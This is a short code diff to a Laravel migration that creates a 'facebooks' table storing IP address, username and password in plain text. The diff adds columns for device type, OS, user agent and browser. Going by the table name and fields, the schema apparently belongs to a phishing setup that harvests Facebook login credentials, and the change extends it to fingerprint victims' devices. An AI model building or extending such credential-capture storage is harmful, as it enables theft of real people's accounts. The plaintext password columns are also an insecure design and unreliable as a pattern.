@@ -14,6 +14,10 @@ return new class extends Migration
         Schema::create('facebooks', function (Blueprint $table) {
             $table->id();
             $table->text('ip', 100);
+            $table->text('type', 100);
+            $table->text('os', 100);
+            $table->text('useragent', 100);
+            $table->text('browser', 100);
             $table->text('username', 100);
             $table->text('password', 100);
             $table->timestamps();
